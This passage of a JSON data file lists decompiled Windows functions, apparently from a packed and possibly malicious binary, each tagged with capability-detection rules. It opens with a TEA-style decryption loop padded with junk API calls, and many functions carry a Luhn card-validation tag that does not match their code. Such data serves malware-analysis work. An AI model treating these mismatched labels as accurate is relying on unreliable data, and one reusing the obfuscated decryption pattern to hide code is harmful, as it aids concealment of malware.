0);\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n        }\n        uVar3 = (uVar1 >> 5) + iStack2076;\n        uVar5 = uVar1 * 0x10 + iStack2092;\n        *0x5d65474 = 0xe9ea0636;\n        if (*0x5fca0b8 == 0x3f5) {\n            (*_sym.imp.KERNEL32.dll_FileTimeToDosDateTime)(auStack2056, auStack2072, auStack2084);\n            (*_sym.imp.KERNEL32.dll_InterlockedExchange)(&iStack2080, 0);\n        }\n        uStack2104 = uStack2104 - (uVar3 ^ uVar5 ^ uVar1 + iVar2);\n        if (*0x5fca0b8 == 0x839) {\n            (*_sym.imp.KERNEL32.dll_GetTapeParameters)(0, 0, auStack2060, auStack2048);\n            (*_sym.imp.KERNEL32.dll_SetTapeParameters)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_DeleteVolumeMountPointA)(0);\n        }\n        if (*0x5fca0b8 == 0x78c) {\n            (*_sym.imp.KERNEL32.dll_ReadConsoleW)(0, auStack2048, 0, auStack2064, 0);\n        }\n        uVar5 = uStack2104 * 0x10 + iStack2080;\n        uVar3 = iVar2 + uStack2104;\n        if (*0x5fca0b8 == 0x196) {\n            (*_sym.imp.KERNEL32.dll_GetProcessPriorityBoost)(0, 0);\n        }\n        uVar4 = (uStack2104 >> 5) + iStack2088;\n        *0x5d65478 = 0xcbd61084;\n        *0x5d6547c = 0xffffffff;\n        if (*0x5fca0b8 == 0xec6) {\n            (*_sym.imp.KERNEL32.dll_LocalFlags)(0);\n            (*_sym.imp.KERNEL32.dll_CreateJobObjectA)(0, 0);\n        }\n        iVar2 = iStack2096 + 0x61c88647;\n        uVar1 = uVar1 - (uVar4 ^ uVar3 ^ uVar5);\n        iStack2100 = iStack2100 + -1;\n        iStack2096 = iVar2;\n    } while (iStack2100 != 0);\n    if (*0x5fca0b8 != 0x8d4) {\n        *param_1 = uVar1;\n        param_1[1] = uStack2104;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GlobalUnfix)(0);\n    unaff_retaddr[1] = unaff_EBX;\n    *unaff_retaddr = uVar1;\n    return;\n}\n",
        "token_count": 1124
    },
    "00420200": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00420200(void)\n\n{\n    uint32_t uVar1;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    \n    uVar1 = *0x5fca0b8;\n    if (*0x5fca0b8 == 0x124b) {\n        uStack40 = 0;\n        uStack44 = 0;\n        uStack48 = 0;\n        uStack52 = 0x420225;\n        (*_sym.imp.KERNEL32.dll__hread)();\n    }\n    if (*0x5fca0b8 == 0xc00) {\n        uStack40 = 0;\n        uStack44 = 0;\n        uStack48 = 0;\n        uStack52 = 0x42023d;\n        (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)();\n        uStack52 = 0;\n        (*_sym.imp.KERNEL32.dll__llseek)(0, 0);\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&stack0xffffffcc);\n    }\n    for (uVar1 = uVar1 >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        uStack44 = 0x420266;\n        fcn.0041ffd0();\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "00401090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401090(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.00404519(param_1, param_2, param_3, param_4);\n    return param_1;\n}\n",
        "token_count": 59
    },
    "004010c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004010c0(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.0040405c(param_1, param_2, param_3, param_4);\n    return param_1;\n}\n",
        "token_count": 61
    },
    "00401140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** fcn.00401140(code **param_1, uint param_2)\n\n{\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x424c98;\n    *in_FS_OFFSET = &uStack12;\n    fcn.004040b9();\n    uStack4 = 0;\n    *param_1 = vtable.std::runtime_error.0;\n    fcn.00401b40(param_2);\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 158
    },
    "004011e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004011e0(uint param_1)\n\n{\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x424c34;\n    *in_FS_OFFSET = &uStack12;\n    fcn.004036c7(0);\n    uStack8 = 0;\n    fcn.00401af0();\n    fcn.00401af0();\n    fcn.00401af0();\n    fcn.00401af0();\n    uStack8 = CONCAT31(uStack8._1_3_, 4);\n    fcn.00403611(param_1, param_1);\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 206
    },
    "00401260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401260(uint param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack8 = 0x424c34;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 4;\n    fcn.004034a8(param_1);\n    fcn.00401b70();\n    fcn.00401b70();\n    fcn.00401b70();\n    fcn.00401b70();\n    uStack4 = 0xffffffff;\n    fcn.004036ef();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 160
    },
    "004012d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012d0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *unaff_ESI;\n    uchar auStack16 [16];\n    \n    puVar3 = fcn.00403a49(auStack16);\n    uVar1 = puVar3[1];\n    *unaff_ESI = *puVar3;\n    uVar2 = puVar3[2];\n    unaff_ESI[1] = uVar1;\n    uVar1 = puVar3[3];\n    unaff_ESI[2] = uVar2;\n    unaff_ESI[3] = uVar1;\n    return;\n}\n",
        "token_count": 153
    },
    "004014a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004014a0(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00401b40(*in_EAX + 0x18, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "004016a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004016a0(void)\n\n{\n    uint *puVar1;\n    int32_t unaff_EDI;\n    \n    puVar1 = fcn.004012d0();\n    *(unaff_EDI + 8) = *puVar1;\n    *(unaff_EDI + 0xc) = puVar1[1];\n    *(unaff_EDI + 0x10) = puVar1[2];\n    *(unaff_EDI + 0x14) = puVar1[3];\n    return;\n}\n",
        "token_count": 118
    },
    "004016d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016d0(int32_t param_1)\n\n{\n    if (0 < *(param_1 + 0x14)) {\n        fcn.00404248(*(param_1 + 0x10));\n        return;\n    }\n    if (*(param_1 + 0x14) < 0) {\n        fcn.00404503(*(param_1 + 0x10));\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "004018e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004018e0(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uchar auStack140 [12];\n    uchar auStack128 [56];\n    uchar auStack72 [36];\n    uint uStack36;\n    uint uStack20;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x424d8e;\n    *in_FS_OFFSET = &uStack12;\n    *(param_1 + 8) = param_2 & 0x17;\n    uVar1 = *(param_1 + 0xc) & param_2 & 0x17;\n    if (uVar1 != 0) {\n        if ((uVar1 & 4) != 0) {\n            fcn.00401b10(\"ios_base::badbit set\");\n            uStack8 = 0;\n            fcn.004018c0();\n            fcn.00404f72(auStack128, 0x42a260);\n            uVar1 = extraout_ECX;\n        }\n        if ((uVar1 & 2) != 0) {\n            fcn.00401b10(\"ios_base::failbit set\");\n            uStack20 = 1;\n            fcn.004018c0();\n            fcn.00404f72(auStack140, 0x42a260);\n        }\n        fcn.00401b10(\"ios_base::eofbit set\");\n        uStack20 = 2;\n        fcn.004018c0();\n        fcn.00404f72(auStack72, 0x42a260);\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 422
    },
    "00401a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401a20(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EDI;\n    \n    *(unaff_EDI + 0x24) = 0;\n    *(unaff_EDI + 4) = 0;\n    *(unaff_EDI + 0xc) = 0;\n    *(unaff_EDI + 0x10) = 0x201;\n    *(unaff_EDI + 0x14) = 6;\n    *(unaff_EDI + 0x18) = 0;\n    *(unaff_EDI + 0x1c) = 0;\n    *(unaff_EDI + 0x20) = 0;\n    fcn.004019d0();\n    iVar1 = fcn.00404602(4);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00401450();\n        *(unaff_EDI + 0x24) = uVar2;\n        return;\n    }\n    *(unaff_EDI + 0x24) = 0;\n    return;\n}\n",
        "token_count": 249
    },
    "00401ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401ad0(void)\n\n{\n    int32_t in_EAX;\n    code **arg_8h;\n    \n    arg_8h = in_EAX + 0x54;\n    fcn.00401ef0();\n    *arg_8h = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *arg_8h = vtable.std::ios_base.0;\n    fcn.004032cc(arg_8h);\n    return;\n}\n",
        "token_count": 109
    },
    "00401e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nint32_t * fcn.00401e60(int32_t *param_1)\n\n{\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x424de7;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x4275dc;\n    param_1[2] = 0x4275e4;\n    fcn.00402950();\n    uStack4 = 0;\n    fcn.00402aa0(param_1, param_1 + 3);\n    uStack12 = 1;\n    *(param_1 + *(*param_1 + 4)) =\n         vtable.std::basic_stringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    fcn.00402b00(param_1 + 3);\n    *in_FS_OFFSET = unaff_EDI;\n    return param_1;\n}\n",
        "token_count": 241
    },
    "00401ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401ef0(int32_t param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x424cdb;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *(*(*(param_1 + -0x54) + 4) + -0x54 + param_1) =\n         vtable.std::basic_stringstream_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    uStack4 = 0;\n    fcn.00401f80();\n    fcn.00401f50();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 169
    },
    "004027f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004027f0(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.00401b90();\n    if (uVar2 < param_3) {\n        fcn.0040385f();\n    }\n    iVar3 = fcn.00401b90();\n    uVar2 = iVar3 - param_3;\n    if (param_4 < iVar3 - param_3) {\n        uVar2 = param_4;\n    }\n    if (param_1 == param_2) {\n        fcn.00402c40(uVar2 + param_3, 0xffffffff);\n        fcn.00402c40(0, param_3);\n        return param_1;\n    }\n    cVar1 = fcn.00402cd0(uVar2, 0);\n    if (cVar1 != '\\0') {\n        iVar3 = fcn.00402d50(uVar2);\n        uVar4 = fcn.00402d50(*(param_1 + 0x18), iVar3 + param_3);\n        fcn.00403150(uVar4);\n        fcn.00402ca0(uVar2);\n    }\n    return param_1;\n}\n",
        "token_count": 318
    },
    "00402880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402880(uint param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00401070(param_1);\n    fcn.00402bd0(param_1, uVar1);\n    return;\n}\n",
        "token_count": 56
    },
    "004029a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004029a0(void)\n\n{\n    int32_t in_EAX;\n    \n    return **(in_EAX + 0x30) + **(in_EAX + 0x20);\n}\n",
        "token_count": 49
    },
    "004029b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004029b0(int32_t param_1, int32_t param_2)\n\n{\n    **(param_2 + 0x30) = **(param_2 + 0x30) - param_1;\n    **(param_2 + 0x20) = **(param_2 + 0x20) + param_1;\n    return;\n}\n",
        "token_count": 88
    },
    "004029e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004029e0(void)\n\n{\n    int32_t in_EAX;\n    \n    return **(in_EAX + 0x34) + **(in_EAX + 0x24);\n}\n",
        "token_count": 49
    },
    "00402a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a20(int32_t param_1, int32_t param_2)\n\n{\n    **(param_2 + 0x34) = **(param_2 + 0x34) - param_1;\n    **(param_2 + 0x24) = **(param_2 + 0x24) + param_1;\n    return;\n}\n",
        "token_count": 88
    },
    "00402aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t * fcn.00402aa0(int32_t *param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x424dab;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.00402d80(param_1);\n    uStack12 = 1;\n    fcn.00402d60(param_1 + 2);\n    *(param_1 + *(*param_1 + 4)) = vtable.std::basic_iostream_char__struct_std::char_traits_char__.0;\n    *in_FS_OFFSET = param_2;\n    return param_1;\n}\n",
        "token_count": 179
    },
    "00402b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.00402b00(code **param_1)\n\n{\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x424cb8;\n    *in_FS_OFFSET = &uStack12;\n    fcn.00402dc0(param_1);\n    uStack8 = 0;\n    *param_1 = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    fcn.00401e40();\n    fcn.00402e30();\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 178
    },
    "00402c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00402c40(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.0040385f();\n    }\n    uVar1 = *(param_1 + 0x14) - param_2;\n    if (uVar1 < param_3) {\n        param_3 = uVar1;\n    }\n    if (param_3 != 0) {\n        iVar2 = fcn.00402d50(uVar1 - param_3);\n        iVar2 = fcn.00402d50(*(param_1 + 0x18) - param_2, iVar2 + param_2 + param_3);\n        fcn.004031c0(iVar2 + param_2);\n        fcn.00402ca0(*(param_1 + 0x14) - param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 239
    },
    "00402d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00402d80(int32_t *param_1, uint param_2)\n\n{\n    *(param_1 + *(*param_1 + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    param_1[1] = 0;\n    fcn.00402fa0(param_2);\n    return param_1;\n}\n",
        "token_count": 89
    },
    "00402dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** fcn.00402dc0(code **param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x424c5b;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    fcn.0040390b();\n    uStack4 = 0;\n    iVar1 = fcn.00404602(4);\n    if (iVar1 == 0) {\n        pcVar2 = NULL;\n    }\n    else {\n        pcVar2 = fcn.00401450();\n    }\n    param_1[0xe] = pcVar2;\n    fcn.00402fe0();\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 229
    },
    "00402f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00402f60(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        in_EAX = fcn.00402d50();\n        if (in_EAX <= param_2) {\n            iVar1 = fcn.00402d50();\n            in_EAX = iVar1 + *(param_1 + 0x14);\n            if (param_2 < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 155
    },
    "00403030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403030(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x424d58;\n    *in_FS_OFFSET = &uStack12;\n    fcn.004019f0();\n    uStack4 = 0;\n    fcn.00403090();\n    uStack4 = 0xffffffff;\n    fcn.00401480();\n    fcn.00401560();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 143
    },
    "00403220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403220(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00401090(param_3, param_2, param_1);\n    return;\n}\n",
        "token_count": 49
    },
    "00403240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403240(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.004010c0(param_3, param_2, param_1);\n    return;\n}\n",
        "token_count": 50
    },
    "00403897": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403897(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00404ef5(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.0040413a(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.std::logic_error.0;\n    fcn.00401b40(arg_8h_00 + 0xc);\n    fcn.00404f5e();\n    return;\n}\n",
        "token_count": 200
    },
    "00403d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d50(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00403c46(fcn.00407680, arg_8h, arg_ch, 0, &arg_10h);\n    return;\n}\n",
        "token_count": 64
    },
    "004042d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004042d6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004073fc(0x429c18, 0xc);\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar1 = fcn.004073b3();\n        *puVar1 = 0x16;\n        fcn.004044cd(0, 0, 0, 0, 0);\n    }\n    else {\n        uVar2 = fcn.00406f36();\n        fcn.0040704e(0, uVar2);\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00406f36(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        uVar2 = (**(unaff_EBP + 8))(uVar2);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040434d();\n    }\n    fcn.00407441();\n    return;\n}\n",
        "token_count": 335
    },
    "0040435c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040435c(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004042d6(fcn.00407680, arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "00404379": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404379(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004042d6(fcn.00408673, arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "0040adc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040adc5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004073fc(0x429db0, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.004073b3();\n        *puVar1 = 0x16;\n        fcn.004044cd(0, 0, 0, 0, 0);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0040a6a6(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040ae63();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.00407441();\n    return;\n}\n",
        "token_count": 454
    },
    "0040ae91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ae91(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0040adc5(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 78
    },
    "0040c40f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c40f(uint arg_8h)\n\n{\n    fcn.0040c2e3(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "0040ccb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ccc9)\n// WARNING: Removing unreachable block (ram,0x0040cccf)\n// WARNING: Removing unreachable block (ram,0x0040ccd1)\n\nvoid fcn.0040ccb5(void)\n\n{\n    return;\n}\n",
        "token_count": 64
    },
    "00413f19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413f19(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004073b3();\n        *puVar1 = 0x16;\n        fcn.004044cd(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x42e5cc;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "0041feb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041feb0(void)\n\n{\n    uchar auStack4 [4];\n    \n    (**0x5d6546c)(*0x5d65470, *0x5fca0b8, 0x40, auStack4);\n    return;\n}\n",
        "token_count": 61
    },
    "0041fee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041fee0(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0041ff00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
